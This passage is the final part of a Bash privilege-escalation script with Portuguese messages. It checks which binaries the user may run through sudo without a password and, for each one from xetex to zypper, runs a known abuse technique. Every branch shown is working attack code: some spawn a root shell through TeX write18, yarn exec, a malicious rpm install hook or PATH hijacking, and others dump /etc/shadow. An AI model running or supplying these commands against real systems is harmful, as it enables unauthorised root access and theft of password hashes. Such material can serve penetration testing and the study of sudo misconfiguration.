            sudo "$paths" -shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
            ;;
        xetex)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --shell-escape '\write18{/bin/sh}\end'
            ;;
        xmodmap)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -v /etc/shadow
            ;;
        xmore)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        xpad)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -f /etc/shadow
            ;;
        xxd)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow | "$paths" -r
            ;;
        xz)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow | "$paths" -d
            ;;
        yarn)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" exec /bin/sh
            ;;
        yash)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ;;
        yum)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 2 tecnicas):"
            TF=$(mktemp -d)
            echo 'id' > $TF/x.sh
            fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
            sudo "$paths" localinstall -y x-1.0-1.noarch.rpm
            ;;
        zathura)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            :! /bin/sh -c 'exec /bin/sh 0<&1'
            ;;
        zip)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp -u)
            sudo "$paths" $TF /etc/hosts -T -TT 'sh #'
            sudo rm $TF
            ;;
        zsh)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ;;
        zsoelim)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        zypper)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp -d)
            cp /bin/sh $TF/zypper-x
            sudo PATH=$TF:$PATH "$paths" x
            ;;
        *)
            echo "[-] Comando sudo permitido: $paths → sem exploit automático registrado."
        ;;
    esac
done
